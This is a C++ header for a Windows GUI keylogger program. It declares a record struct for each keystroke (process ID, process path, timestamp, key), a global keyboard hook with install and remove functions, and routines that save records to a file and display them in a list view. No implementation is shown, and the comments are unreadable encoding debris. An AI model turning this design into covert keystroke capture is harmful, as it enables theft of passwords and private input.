#pragma once

#include "resource.h"
#include <string>
#include <vector>
#include <sstream>
#include <windows.h>
#include <fstream>
#include <commctrl.h>
#include <commdlg.h>
#include <shlobj.h>
#include <ctime>
#include <unordered_map>
#include <shellapi.h>
#include <psapi.h>


using namespace std;

#define MAX_LOADSTRING  100
#define IDC_LISTVIEW    101

#define OnClearedField	1
#define OnClearedList	2
#define OnSearch    	3
#define OnReadFile		4
#define OnLoadDatabase  5

#define OnCreateFile	6
#define OnRecordAction	7
#define OnOpenFile  	8

#define TextBufferSize	1000

struct KeyloggerRecord {
    DWORD processId;          // ID ��������
    wstring processPath;       // ���� � ����������� ��������
    wstring dateTime;          // ���� � ����� ��������
    int keyCode;              // ��� �������
    wstring keyChar;             // ������ �������

    // ����������� ��� ������������� ��������
    KeyloggerRecord(DWORD pid = 0, wstring path = L"", wstring dt = L"", int code = 0, wstring key = L"")
        : processId(pid), processPath(path), dateTime(dt), keyCode(code), keyChar(key) {
    }
};

vector<KeyloggerRecord> keyloggerRecords;  // ���������� ��������� ��� �������� �������
const char delimeter = ';';  // ����������� ��� ������

bool fileOpened;								// ���� �������� ����� ��� ������
bool isRecordStarted = false;					// ���� ������ ������ �������� � ����

HHOOK keyboardHook;                             // ��� ����������
HWND hEditControl;								// ���� �����
HWND hComboBox;									// ���������� ����
char filename[MAX_PATH];						// ��� �������� ���� � ���������� �����

OPENFILENAMEA ofn;								// ��������� ��� ������� �������� �����
HINSTANCE hInst;                                // ������� ���������
WCHAR szTitle[MAX_LOADSTRING];                  // ����� ������ ���������
WCHAR szWindowClass[MAX_LOADSTRING];            // ��� ������ �������� ����
HWND hwndListView;                              // ���������� ��� ListView

HWND hwndRecordButton;                          // ������ ������/�������� ������ ������� ������
HWND hwndFilePathLabel;                         // ��������� �� ������, ������������ ���� �����

ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

void                MainWndAddMenues(HWND hwnd);
void                MainWndAddWidgets(HWND hwnd);

void                SetOpenFileParams(HWND hwnd);

void                DefineColumns(HWND hwndLV);


void LoadKeyloggerRecordsFromFile(HWND hWnd);
void KeyloggerFilling(HWND hwndListView);

BOOL SelectFolderDialog(HWND hwnd, char* folderPath);
void CreateFileInSelectedFolder(HWND hwnd);
void WriteToFileANSI(const KeyloggerRecord& record);

void LoadKeyloggerRecordsFromFile(HWND hwnd);

wstring GetKeyStringFromCode(int keyCode);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void SetKeyboardHook();
void RemoveKeyboardHook();

std::wstring ANSIToWideString(const std::string& ansiStr);
void OpenTextFile();
void UpdateFilePathLabel();

